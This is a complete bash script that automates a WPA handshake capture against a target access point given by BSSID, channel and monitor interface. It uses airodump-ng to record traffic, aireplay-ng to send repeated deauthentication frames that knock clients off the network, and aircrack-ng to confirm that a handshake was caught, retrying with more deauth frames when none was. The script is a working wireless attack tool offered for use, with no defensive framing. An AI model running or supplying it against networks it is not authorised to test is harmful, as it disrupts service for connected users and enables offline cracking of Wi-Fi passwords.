#!/bin/bash
# Automated handshake capture
BSSID="${1:?Usage: $0 <BSSID> <channel> <interface>}"
CHAN="${2}"
IFACE="${3:-wlan0mon}"
OUT="handshake-${BSSID//:/}"

echo "[*] Starting capture on $BSSID ch$CHAN"
airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$OUT" "$IFACE" &
DUMP_PID=$!

echo "[*] Sending 5 deauth frames"
aireplay-ng -0 5 -a "$BSSID" "$IFACE"
sleep 15
kill $DUMP_PID

if aircrack-ng "${OUT}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
    echo "[+] Handshake captured: ${OUT}-01.cap"
else
    echo "[!] No handshake, retrying with 10 deauths..."
    airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$OUT" "$IFACE" &
    aireplay-ng -0 10 -a "$BSSID" "$IFACE"
    sleep 15
    kill %1
fi
